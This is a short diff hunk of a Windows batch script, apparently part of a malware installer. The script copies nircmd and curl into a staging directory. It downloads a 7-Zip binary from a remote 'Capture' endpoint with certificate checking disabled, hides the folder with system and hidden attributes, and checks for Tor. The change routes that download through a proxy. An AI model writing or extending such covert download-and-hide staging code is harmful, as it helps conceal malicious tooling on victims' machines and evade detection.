@@ -24,7 +24,7 @@ echo F | xcopy /H /k /y /I "nircmd.exe" "%environment%\nircmd.exe"
 echo F | xcopy /H /k /y /I "curl.exe" "%environment%\curl.exe" 
 
 mkdir "%environment%\7-Zip"
-"%environment%\curl.exe" -k %host%/Capture/7za.exe -o "%environment%\7-Zip\7z.exe" attrib +s +h +i "%environment%\7-Zip"
+"%environment%\curl.exe" -k %proxy% %host%/Capture/7za.exe -o "%environment%\7-Zip\7z.exe" attrib +s +h +i "%environment%\7-Zip"
 
 if exist "%environment%\tor.exe" (
     echo.
